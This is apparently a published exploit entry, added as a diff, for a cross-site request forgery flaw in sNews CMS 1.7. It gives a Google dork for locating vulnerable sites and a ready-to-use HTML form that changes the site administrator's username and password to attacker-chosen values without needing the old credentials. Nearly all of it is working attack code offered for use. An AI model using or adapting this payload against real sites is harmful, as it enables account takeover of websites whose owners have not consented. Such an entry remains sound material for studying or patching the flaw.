@@ -1,0 +1,27 @@
+# Exploit Title : Snews CMS Cross Site Request Forgery
+# Author : Ashiyane Digital Security Team
+# Google Dork : "This site is powered by sNews"
+# Date :  1/11/2016
+# Type : webapps
+# Platform : PHP
+# Vendor Homepage : http://snewscms.com/
+# Software link : http://snewscms.com/download/snews1.7.1.zip
+# Version : 1.7(latest)
+#######################################################3
+Change Username and Password of admin
+We Dont need old user name and old password
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <form name="form0" action="http://localhost/?action=process&task=changeup" method="POST">
+      <input type="hidden" name="uname" value="Attacker" /> // new username
+      <input type="hidden" name="pass1" value="Attacker" /> //new password
+      <input type="hidden" name="pass2" value="Atacker" />// repeat new password
+      <input type="hidden" name="task" value="changeup" />
+      <input type="submit" name="submit_pass" value="Save" />
+    </form>
+  </body>
+</html>
+####################################################
+######### exploit by: Amir.ght #####################
+####################################################
